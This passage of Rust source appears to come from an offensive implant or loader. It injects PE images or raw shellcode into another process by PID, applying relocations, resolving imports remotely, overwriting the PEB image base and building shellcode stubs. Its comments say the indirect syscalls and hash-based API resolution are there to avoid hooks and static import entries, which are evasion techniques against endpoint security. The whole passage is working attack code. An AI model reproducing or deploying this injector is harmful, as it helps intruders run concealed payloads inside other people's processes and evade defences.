        }
        let orig_first_thunk_rva =
            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
        let name_rva =
            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
        let first_thunk_rva =
            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
        if name_rva == 0 {
            break;
        }

        let name_off = rva_to_file_offset32(name_rva, nt);
        let first_thunk_off = rva_to_file_offset32(first_thunk_rva, nt);
        let thunk_rva_off = if orig_first_thunk_rva != 0 {
            rva_to_file_offset32(orig_first_thunk_rva, nt)
        } else {
            first_thunk_off
        };
        if name_off >= payload.len() {
            desc_off += 20;
            continue;
        }

        let dll_name_bytes = &payload[name_off..];
        let null_pos = dll_name_bytes
            .iter()
            .position(|&b| b == 0)
            .unwrap_or(dll_name_bytes.len());
        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
            Ok(s) => s,
            Err(_) => {
                desc_off += 20;
                continue;
            }
        };

        let dll_name_norm = normalize_dll_name(dll_name_str);
        let remote_dll_base = ensure_remote_module_loaded32_cached(
            hprocess,
            &dll_name_norm,
            &mut remote_modules,
            load_library_a_addr,
        )?;

        let mut thunk_off = thunk_rva_off;
        let mut iat_rva = first_thunk_rva;
        loop {
            if thunk_off + 4 > payload.len() {
                break;
            }
            let thunk_val =
                u32::from_le_bytes(payload[thunk_off..thunk_off + 4].try_into().unwrap());
            if thunk_val == 0 {
                break;
            }

            let func_addr: usize = if (thunk_val & 0x8000_0000) != 0 {
                let ord = (thunk_val & 0xFFFF) as u16;
                match resolve_remote_export32_by_ordinal(
                    hprocess,
                    remote_dll_base,
                    ord,
                    &mut remote_modules,
                    load_library_a_addr,
                    0,
                ) {
                    Ok(addr) => addr,
                    Err(_) => {
                        tracing::warn!(
                            "fix_iat_remote32: ordinal {} in {} unresolved in target process",
                            ord,
                            dll_name_norm
                        );
                        unresolved_count += 1;
                        0
                    }
                }
            } else {
                let ibn_rva = thunk_val as usize;
                let ibn_off = rva_to_file_offset32(ibn_rva, nt);
                if ibn_off + 2 >= payload.len() {
                    thunk_off += 4;
                    iat_rva += 4;
                    continue;
                }
                let name_start = ibn_off + 2;
                let name_bytes = &payload[name_start..];
                let nlen = name_bytes
                    .iter()
                    .position(|&b| b == 0)
                    .unwrap_or(name_bytes.len());
                let import_name = String::from_utf8_lossy(&name_bytes[..nlen]).to_string();
                match resolve_remote_export32(
                    hprocess,
                    remote_dll_base,
                    &import_name,
                    &mut remote_modules,
                    load_library_a_addr,
                    0,
                ) {
                    Ok(addr) => addr,
                    Err(_) => {
                        tracing::warn!(
                            "fix_iat_remote32: {}!{} unresolved in target process",
                            dll_name_norm,
                            import_name
                        );
                        unresolved_count += 1;
                        0
                    }
                }
            };

            if func_addr != 0 {
                let func_addr32 = u32::try_from(func_addr).map_err(|_| {
                    anyhow!(
                        "fix_iat_remote32: resolved address {func_addr:#x} for {} exceeds 32-bit range",
                        dll_name_str
                    )
                })?;
                let iat_remote = (remote_base + iat_rva) as *mut c_void;
                let write_status = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64,
                    iat_remote as u64,
                    &func_addr32 as *const _ as u64,
                    4u64,
                    written as *mut _ as u64,
                );
                if write_status.as_ref().map_or(true, |s| *s < 0) || *written != 4 {
                    return Err(anyhow!(
                        "fix_iat_remote32: NtWriteVirtualMemory IAT write failed at RVA {:#x} (status={:?}, wrote={})",
                        iat_rva,
                        write_status,
                        *written
                    ));
                }
            }

            thunk_off += 4;
            iat_rva += 4;
        }

        desc_off += 20;
    }

    if unresolved_count > 0 {
        return Err(anyhow::anyhow!(
            "fix_iat_remote32: {} import(s) could not be resolved — payload would crash at runtime",
            unresolved_count
        ));
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn apply_section_protections32(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32,
) {
    use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};

    const SCN_EXEC: u32 = 0x2000_0000;
    const SCN_WRITE: u32 = 0x8000_0000;

    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
    let first_section = (nt as usize
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32>())
        as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
    for i in 0..num_sections {
        let sec = &*first_section.add(i);
        let chars = sec.Characteristics;
        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
            (true, true) => PAGE_EXECUTE_READ,
            (true, false) => PAGE_EXECUTE_READ,
            (false, true) => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let virt_size = (sec.Misc.VirtualSize as usize).max(sec.SizeOfRawData as usize);
        if virt_size == 0 {
            continue;
        }
        let mut addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
        let mut sz = virt_size;
        let mut old = 0u32;
        let status = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            hprocess as u64,
            &mut addr as *mut _ as u64,
            &mut sz as *mut _ as u64,
            protect as u64,
            &mut old as *mut _ as u64,
        );
        if status.as_ref().map_or(true, |s| *s < 0) {
            tracing::warn!(
                "apply_section_protections32: NtProtectVirtualMemory(section={:?}, base={:#x}, size={:#x}) failed: {:?}",
                &sec.Name,
                addr as usize,
                virt_size,
                status
            );
        }
    }
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    hprocess: *mut c_void,
    remote_base: usize,
    nt: *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
    payload: &[u8],
    delta: isize,
) -> Result<()> {
    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
        [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
        return Ok(());
    }
    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;

    // Convert the relocation-directory RVA to a file offset.  The data-directory
    // VirtualAddress is a PE RVA, not a raw file offset; they differ when the
    // .reloc section has a different PointerToRawData than VirtualAddress.
    let reloc_file_off = rva_to_file_offset(reloc_dir.VirtualAddress as usize, nt);
    let reloc_end_off = reloc_file_off
        .checked_add(reloc_dir.Size as usize)
        .ok_or_else(|| anyhow!("apply_relocations_remote: relocation directory range overflow"))?;
    if reloc_end_off > payload.len() {
        return Err(anyhow!(
            "apply_relocations_remote: relocation directory out of payload bounds (off={:#x}, size={:#x}, payload={:#x})",
            reloc_file_off,
            reloc_dir.Size,
            payload.len()
        ));
    }

    let mut offset = reloc_file_off;
    while offset + 8 <= reloc_end_off {
        let page_rva = u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
        let block_size =
            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
        if block_size < 8 {
            return Err(anyhow!(
                "apply_relocations_remote: invalid relocation block size {} at file offset {:#x}",
                block_size,
                offset
            ));
        }
        let block_end = offset
            .checked_add(block_size)
            .ok_or_else(|| anyhow!("apply_relocations_remote: relocation block range overflow"))?;
        if block_end > reloc_end_off {
            return Err(anyhow!(
                "apply_relocations_remote: relocation block overruns directory (block_end={:#x}, reloc_end={:#x})",
                block_end,
                reloc_end_off
            ));
        }

        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry_off = offset + 8 + i * 2;
            if entry_off + 2 > block_end {
                return Err(anyhow!(
                    "apply_relocations_remote: truncated relocation entry at file offset {:#x}",
                    entry_off
                ));
            }
            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
            let typ = (entry >> 12) as u8;
            let rel = (entry & 0x0FFF) as usize;
            match typ {
                // IMAGE_REL_BASED_DIR64 (PE32+)
                10 => {
                    let target_rva = page_rva
                        .checked_add(rel)
                        .ok_or_else(|| anyhow!("apply_relocations_remote: target RVA overflow"))?;
                    let end_rva = target_rva.checked_add(8).ok_or_else(|| {
                        anyhow!("apply_relocations_remote: relocation target range overflow")
                    })?;
                    if end_rva > image_size {
                        return Err(anyhow!(
                            "apply_relocations_remote: relocation target out of image bounds (rva={:#x}, size=8, image={:#x})",
                            target_rva,
                            image_size
                        ));
                    }
                    let target_addr = remote_base
                        .checked_add(target_rva)
                        .ok_or_else(|| anyhow!("apply_relocations_remote: target VA overflow"))?;
                    let target = target_addr as *mut c_void;

                    let mut val: u64 = 0;
                    let mut rd: usize = 0;
                    let rs = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &mut val as *mut _ as u64,
                        8u64,
                        &mut rd as *mut _ as u64,
                    );
                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 8 {
                        return Err(anyhow!(
                            "apply_relocations_remote: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
                            target as usize,
                            rs,
                            rd
                        ));
                    }

                    val = val.wrapping_add(delta as u64);
                    let mut wr: usize = 0;
                    let ws = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &val as *const _ as u64,
                        8u64,
                        &mut wr as *mut _ as u64,
                    );
                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 8 {
                        return Err(anyhow!(
                            "apply_relocations_remote: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
                            target as usize,
                            ws,
                            wr
                        ));
                    }
                }
                // IMAGE_REL_BASED_HIGHLOW (PE32): 32-bit absolute VA.
                // Use u32 wrapping arithmetic — `delta as u32` takes the low 32
                // bits of the signed delta, giving correct modular results even
                // when delta exceeds i32::MAX (e.g. remote_base near 0xC000_0000).
                3 => {
                    let target_rva = page_rva
                        .checked_add(rel)
                        .ok_or_else(|| anyhow!("apply_relocations_remote: target RVA overflow"))?;
                    let end_rva = target_rva.checked_add(4).ok_or_else(|| {
                        anyhow!("apply_relocations_remote: relocation target range overflow")
                    })?;
                    if end_rva > image_size {
                        return Err(anyhow!(
                            "apply_relocations_remote: relocation target out of image bounds (rva={:#x}, size=4, image={:#x})",
                            target_rva,
                            image_size
                        ));
                    }
                    let target_addr = remote_base
                        .checked_add(target_rva)
                        .ok_or_else(|| anyhow!("apply_relocations_remote: target VA overflow"))?;
                    let target = target_addr as *mut c_void;

                    let mut val: u32 = 0;
                    let mut rd: usize = 0;
                    let rs = nt_syscall::syscall!(
                        "NtReadVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &mut val as *mut _ as u64,
                        4u64,
                        &mut rd as *mut _ as u64,
                    );
                    if rs.as_ref().map_or(true, |s| *s < 0) || rd != 4 {
                        return Err(anyhow!(
                            "apply_relocations_remote: NtReadVirtualMemory failed at target {:#x} (status={:?}, read={})",
                            target as usize,
                            rs,
                            rd
                        ));
                    }

                    let patched = val.wrapping_add(delta as u32);
                    let mut wr: usize = 0;
                    let ws = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64,
                        target as u64,
                        &patched as *const _ as u64,
                        4u64,
                        &mut wr as *mut _ as u64,
                    );
                    if ws.as_ref().map_or(true, |s| *s < 0) || wr != 4 {
                        return Err(anyhow!(
                            "apply_relocations_remote: NtWriteVirtualMemory failed at target {:#x} (status={:?}, wrote={})",
                            target as usize,
                            ws,
                            wr
                        ));
                    }
                }
                _ => {}
            }
        }
        offset = block_end;
    }
    Ok(())
}

/// Inject a PE or shellcode payload into an existing process identified by PID.
#[cfg(windows)]
pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {
    unsafe { inject_into_process_impl(pid, payload, false).map(|_| ()) }
}

/// Inject a PE or shellcode payload and return target-process metadata.
#[cfg(windows)]
pub fn inject_into_process_with_info(pid: u32, payload: &[u8]) -> Result<InjectedProcess> {
    unsafe { inject_into_process_impl(pid, payload, true) }
}

#[cfg(windows)]
unsafe fn inject_into_process_impl(
    pid: u32,
    payload: &[u8],
    keep_handles: bool,
) -> Result<InjectedProcess> {
    use std::ptr::null_mut;
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    };
    use windows_sys::Win32::System::SystemServices::{
        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
    };
    use windows_sys::Win32::System::Threading::{
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ,
        PROCESS_VM_WRITE,
    };
    use OBJECT_ATTRIBUTES;

    unsafe {
        // P0-13: NtOpenProcess indirect syscall — no static IAT entry.
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
        let access_mask = (PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION) as u64;
        let mut h_proc_usize: usize = 0;
        let open_status = nt_syscall::syscall!(
            "NtOpenProcess",
            &mut h_proc_usize as *mut _ as u64,
            access_mask,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );
        if let Ok(s) = open_status {
            if s < 0 || h_proc_usize == 0 {
                return Err(anyhow!(
                    "NtOpenProcess(pid={}) failed: status={:#x}",
                    pid,
                    s
                ));
            }
        } else {
            return Err(anyhow!(
                "NtOpenProcess(pid={}) syscall dispatch failed",
                pid
            ));
        }
        let hprocess = h_proc_usize as *mut c_void;
        let injected_base_addr: usize;
        let created_thread: Option<*mut c_void>;

        // P0-13: NtClose via indirect syscall — no CloseHandle fallback.
        macro_rules! close_h {
            ($h:expr) => {
                let _ = nt_syscall::syscall!("NtClose", $h as u64);
            };
        }

        // Resolve NtCreateThreadEx via PEB walk to avoid hookable CreateRemoteThread
        let ntdll_base =
            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
                .unwrap_or(0);
        if ntdll_base == 0 {
            close_h!(hprocess);
            return Err(anyhow!("inject_into_process: ntdll not found"));
        }
        let ntcreate_addr = pe_resolve::get_proc_address_by_hash(
            ntdll_base,
            pe_resolve::hash_str(b"NtCreateThreadEx\0"),
        )
        .ok_or_else(|| anyhow!("inject_into_process: NtCreateThreadEx not found"))?;
        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut c_void,
            u32,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            *mut c_void,
            u32,
            usize,
            usize,
            usize,
            *mut c_void,
        ) -> i32;
        let nt_create_thread: NtCreateThreadExFn = std::mem::transmute(ntcreate_addr);

        #[repr(C)]
        struct ProcessBasicInformation {
            reserved1: *mut c_void,
            peb_base_address: *mut c_void,
            reserved2: [*mut c_void; 2],
            unique_process_id: usize,
            reserved3: *mut c_void,
        }
        type NtQueryInformationProcessFn =
            unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
        let nt_query_information_process: Option<NtQueryInformationProcessFn> =
            pe_resolve::get_proc_address_by_hash(
                ntdll_base,
                pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
            )
            .map(|p| std::mem::transmute::<*const (), NtQueryInformationProcessFn>(p as *const ()));

        fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
            if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
                return false;
            }

            let e_lfanew =
                u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]])
                    as usize;

            if (e_lfanew & 0x3) != 0 {
                return false;
            }

            let sig_end = match e_lfanew.checked_add(4) {
                Some(v) => v,
                None => return false,
            };
            if sig_end > payload.len() {
                return false;
            }

            payload[e_lfanew..sig_end] == *b"PE\0\0"
        }

        // Determine if this is a PE image or raw shellcode
        let is_pe = payload_has_valid_pe_headers(payload);
        if is_pe {
            let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
            if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid DOS magic"));
            }
            let nt =
                (payload.as_ptr() as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

            let nt_off = (*dos).e_lfanew as usize;
            if nt_off.saturating_add(std::mem::size_of::<IMAGE_NT_HEADERS64>()) > payload.len() {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: e_lfanew ({nt_off:#x}) out of bounds for payload of {} bytes",
                    payload.len()
                ));
            }
            if (*nt).Signature != IMAGE_NT_SIGNATURE {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: invalid NT signature"));
            }
            // Only PE64 (Magic = 0x020B) is supported.
            let opt_magic = (*nt).OptionalHeader.Magic;
            if opt_magic
                != windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC
            {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: only PE64 payloads are supported (found Magic=0x{:x})",
                    opt_magic
                ));
            }

            let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
            let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
            let ep_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
            let size_of_headers = (*nt).OptionalHeader.SizeOfHeaders as usize;
            if image_size == 0 {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: PE64 payload has SizeOfImage=0"
                ));
            }
            if ep_rva >= image_size {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: PE64 entry point RVA {ep_rva:#x} is outside image size {image_size:#x}"
                ));
            }
            if let Err(e) = checked_payload_range(payload.len(), 0, size_of_headers, "PE64 headers")
            {
                close_h!(hprocess);
                return Err(anyhow!("inject_into_process: {e}"));
            }
            if size_of_headers > image_size {
                close_h!(hprocess);
                return Err(anyhow!(
                    "inject_into_process: PE64 SizeOfHeaders {size_of_headers:#x} exceeds SizeOfImage {image_size:#x}"
                ));
            }

            // 4.1: Verify the PE can be relocated if we cannot map at its preferred
            // base.  A PE without a relocation directory (.reloc section / reloc
            // DataDirectory) that is loaded at a different address will have all
            // absolute addresses broken — refuse to inject rather than inject
            // silently broken code.
            let reloc_dir = (*nt).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_BASERELOC
                    as usize];
            let has_relocs = reloc_dir.VirtualAddress != 0 && reloc_dir.Size != 0;

            // P0-13: NtAllocateVirtualMemory with preferred base hint.
            let mut remote_base_val: usize = preferred_base;
            let mut alloc_size = image_size;
            let alloc_status = nt_syscall::syscall!(
                "NtAllocateVirtualMemory",
                hprocess as u64,
                &mut remote_base_val as *mut _ as u64,
                0u64,
                &mut alloc_size as *mut _ as u64,
                (MEM_COMMIT | MEM_RESERVE) as u64,
                PAGE_READWRITE as u64,
            );
            let remote_mem = if alloc_status.map_or(true, |s| s < 0) || remote_base_val == 0 {
                if !has_relocs {
                    // Cannot load at preferred base and there is no reloc table.
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process(pid={}): PE has no relocation directory and preferred \
                         base 0x{:x} is not available; cannot load at an alternative address",
                        pid, preferred_base
                    ));
                }
                // Retry with null base (system chooses).
                remote_base_val = 0;
                alloc_size = image_size;
                let retry = nt_syscall::syscall!(
                    "NtAllocateVirtualMemory",
                    hprocess as u64,
                    &mut remote_base_val as *mut _ as u64,
                    0u64,
                    &mut alloc_size as *mut _ as u64,
                    (MEM_COMMIT | MEM_RESERVE) as u64,
                    PAGE_READWRITE as u64,
                );
                if retry.map_or(true, |s| s < 0) || remote_base_val == 0 {
                    null_mut()
                } else {
                    remote_base_val as *mut c_void
                }
            } else {
                remote_base_val as *mut c_void
            };

            if remote_mem.is_null() {
                close_h!(hprocess);
                return Err(anyhow!("NtAllocateVirtualMemory(pid={}) failed", pid));
            }

            let remote_base = remote_mem as usize;
            injected_base_addr = remote_base;
            let mut written: usize = 0;
            // P0-13: NtWriteVirtualMemory for PE headers.
            let write_status = nt_syscall::syscall!(
                "NtWriteVirtualMemory",
                hprocess as u64,
                remote_mem as u64,
                payload.as_ptr() as u64,
                size_of_headers as u64,
                &mut written as *mut _ as u64,
            );
            if write_status.as_ref().map_or(true, |s| *s < 0) || written != size_of_headers {
                close_h!(hprocess);
                return Err(anyhow!(
                    "NtWriteVirtualMemory(headers) failed: status={:?}, wrote={}, expected={}",
                    write_status,
                    written,
                    size_of_headers
                ));
            }

            let num_sections = (*nt).FileHeader.NumberOfSections as usize;
            let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_SECTION_HEADER;
            for i in 0..num_sections {
                let sec = &*first_section.add(i);
                let raw_off = sec.PointerToRawData as usize;
                let raw_sz = sec.SizeOfRawData as usize;
                if raw_sz == 0 {
                    continue;
                }
                if raw_off == 0 {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: section {} has SizeOfRawData={:#x} but PointerToRawData=0",
                        i,
                        raw_sz
                    ));
                }

                let section_rva = sec.VirtualAddress as usize;
                if section_rva >= image_size {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: section {} RVA {:#x} is outside image size {:#x}",
                        i,
                        section_rva,
                        image_size
                    ));
                }

                let max_in_image = image_size - section_rva;
                if raw_sz > max_in_image {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: section {} raw size {:#x} exceeds mapped image bounds at RVA {:#x} (remaining {:#x})",
                        i,
                        raw_sz,
                        section_rva,
                        max_in_image
                    ));
                }

                let raw_end = match raw_off.checked_add(raw_sz) {
                    Some(v) => v,
                    None => {
                        close_h!(hprocess);
                        return Err(anyhow!(
                            "inject_into_process: section {} raw range overflow (offset={:#x}, size={:#x})",
                            i,
                            raw_off,
                            raw_sz
                        ));
                    }
                };
                if raw_end > payload.len() {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "inject_into_process: section {} raw range [{:#x}, {:#x}) exceeds payload size {:#x}",
                        i,
                        raw_off,
                        raw_end,
                        payload.len()
                    ));
                }

                let copy_sz = raw_sz;
                let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
                // P0-13: NtWriteVirtualMemory for section data.
                written = 0;
                let section_write_status = nt_syscall::syscall!(
                    "NtWriteVirtualMemory",
                    hprocess as u64,
                    dst as u64,
                    payload.as_ptr().add(raw_off) as u64,
                    copy_sz as u64,
                    &mut written as *mut _ as u64,
                );
                if section_write_status.as_ref().map_or(true, |s| *s < 0) || written != copy_sz {
                    close_h!(hprocess);
                    return Err(anyhow!(
                        "NtWriteVirtualMemory(section {}, pid={}) failed: status={:?}, wrote={}, expected={}",
                        i,
                        pid,
                        section_write_status,
                        written,
                        copy_sz
                    ));
                }
            }

            let delta = remote_base as isize - preferred_base as isize;
            if delta != 0 {
                if let Err(e) = apply_relocations_remote(hprocess, remote_base, nt, payload, delta)
                {
                    close_h!(hprocess);
                    return Err(e);
                }
            }

            // Resolve IAT while memory is still writable (2.2)
            if let Err(e) = fix_iat_remote(hprocess, remote_base, nt, payload, &mut written) {
                close_h!(hprocess);
                return Err(e);
            }

            // Mirror hollow-and-execute behavior: update PEB.ImageBaseAddress
            // before starting remote execution.
            if let Some(nt_query) = nt_query_information_process {
                let mut pbi: ProcessBasicInformation = std::mem::zeroed();
                let mut return_len: u32 = 0;
                let status = nt_query(
                    hprocess,
                    0, // ProcessBasicInformation
                    &mut pbi as *mut _ as *mut c_void,
                    std::mem::size_of::<ProcessBasicInformation>() as u32,
                    &mut return_len as *mut u32,
                );

                if status >= 0 && !pbi.peb_base_address.is_null() {
                    // P0-13: NtWriteVirtualMemory for PEB image-base update.
                    let _ = nt_syscall::syscall!(
                        "NtWriteVirtualMemory",
                        hprocess as u64,
                        (pbi.peb_base_address as *const u8).add(0x10) as u64,
                        &remote_base as *const _ as u64,
                        std::mem::size_of::<usize>() as u64,
                        &mut written as *mut _ as u64,
                    );
                } else {
                    tracing::warn!(
                        "inject_into_process: NtQueryInformationProcess failed ({:x}); skipping PEB image-base update",
                        status
                    );
                }
            } else {
                tracing::warn!(
                    "inject_into_process: NtQueryInformationProcess not resolved; skipping PEB image-base update"
                );
            }

            // Apply per-section protections after writing (2.4)
            apply_section_protections(hprocess, remote_base, nt);

            // Flush the instruction cache for the entire mapped image so the
            // CPU sees the newly-written code (L-04 fix).
            // P0-13: NtFlushInstructionCache indirect syscall.
            let _ = nt_syscall::syscall!(
                "NtFlushInstructionCache",
                hprocess as u64,
                remote_mem as u64,
                image_size as u64,
            );

            // ── TLS callbacks, .pdata registration, and entrypoint args ─────
            // The Windows loader calls TLS callbacks before the entry point,
            // registers .pdata for structured exception unwinding, and passes
            // (hinstDLL, DLL_PROCESS_ATTACH, NULL) to DllMain.  A bare remote
            // thread at the entry point skips all of this, causing crashes in
            // payloads that rely on TLS initializers or SEH.
            let mut tls_callback_vas: Vec<usize> = Vec::new();
            {
                const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
                let tls_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
                if tls_dir.VirtualAddress != 0 && tls_dir.Size != 0 {
                    let tls_rva = tls_dir.VirtualAddress as usize;
                    if tls_rva + 40 <= image_size {
                        let tls_offset = rva_to_file_offset(tls_rva, nt);
                        if tls_offset + 32 <= payload.len() {
                            let callbacks_va_raw = u64::from_le_bytes(
                                payload[tls_offset + 24..tls_offset + 32]
                                    .try_into()
                                    .unwrap_or([0u8; 8]),
                            ) as usize;
                            if callbacks_va_raw != 0 {
                                let callbacks_va = (callbacks_va_raw as isize + delta) as usize;
                                let mut remaining = 32u32;
                                let mut slot_idx = 0usize;
                                loop {
                                    if remaining == 0 {
                                        break;
                                    }
                                    remaining -= 1;
                                    let callbacks_rva =
                                        callbacks_va_raw.wrapping_sub(preferred_base);
                                    let callbacks_file_offset =
                                        rva_to_file_offset(callbacks_rva, nt);
                                    let slot_offset = callbacks_file_offset + slot_idx * 8;
                                    if slot_offset + 8 > payload.len() {
                                        break;
                                    }
                                    let cb_va_raw = u64::from_le_bytes(
                                        payload[slot_offset..slot_offset + 8]
                                            .try_into()
                                            .unwrap_or([0u8; 8]),
                                    ) as usize;
                                    if cb_va_raw == 0 {
                                        break;
                                    }
                                    let cb_va = (cb_va_raw as isize + delta) as usize;
                                    if cb_va >= remote_base && cb_va < remote_base + image_size {
                                        tls_callback_vas.push(cb_va);
                                    }
                                    slot_idx += 1;
                                }
                            }
                        }
                    }
                }
            }

            // Find .pdata for exception unwinding.
            #[cfg(target_arch = "x86_64")]
            let (pdata_va, pdata_count) = {
                let mut result = (0usize, 0u32);
                const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
                let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
                if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
                    let va = remote_base + exc_dir.VirtualAddress as usize;
                    let count = (exc_dir.Size as usize / 12) as u32;
                    if count > 0 {
                        result = (va, count);
                    }
                }
                result
            };
            #[cfg(target_arch = "aarch64")]
            let (pdata_va, pdata_count) = {
                let mut result = (0usize, 0u32);
                const IMAGE_DIRECTORY_ENTRY_EXCEPTION: usize = 3;
                let exc_dir = &(*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
                if exc_dir.VirtualAddress != 0 && exc_dir.Size > 0 {
                    let va = remote_base + exc_dir.VirtualAddress as usize;
                    let count = (exc_dir.Size as usize / 12) as u32;
                    if count > 0 {
                        result = (va, count);
                    }
                }
                result
            };

            let rtl_add_fn_addr = if pdata_va != 0 && pdata_count != 0 {
                resolve_nt(b"RtlAddFunctionTable\0").unwrap_or(0)
            } else {
                0
            };

            let needs_stub = !tls_callback_vas.is_empty()
                || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);

            let entry_va = if needs_stub {
                // Build position-independent shellcode:
                //   (a) call RtlAddFunctionTable (if .pdata present)
                //   (b) call each TLS callback with (hinstDLL, DLL_PROCESS_ATTACH, NULL)
                //   (c) jump to payload entry point with DllMain args set up
                let mut stub: Vec<u8> = Vec::with_capacity(256);

                #[cfg(target_arch = "x86_64")]
                {
                    // ABI prologue: reserve shadow space, align RSP.
                    stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20

                    // .pdata registration.
                    if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                        stub.extend_from_slice(&[0x48, 0xB9]); // movabs rcx, pdata_va
                        stub.extend_from_slice(&(pdata_va as u64).to_le_bytes());
                        stub.extend_from_slice(&[0xBA]); // mov edx, count
                        stub.extend_from_slice(&pdata_count.to_le_bytes());
                        stub.extend_from_slice(&[0x49, 0xB8]); // movabs r8, remote_base
                        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
                        stub.extend_from_slice(&[0x48, 0xB8]); // movabs rax, RtlAddFunctionTable
                        stub.extend_from_slice(&(rtl_add_fn_addr as u64).to_le_bytes());
                        stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
                    }

                    // TLS callback invocations: DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
                    for &cb_va in &tls_callback_vas {
                        stub.extend_from_slice(&[0x48, 0xB9]); // mov rcx, remote_base
                        stub.extend_from_slice(&(remote_base as u64).to_le_bytes());
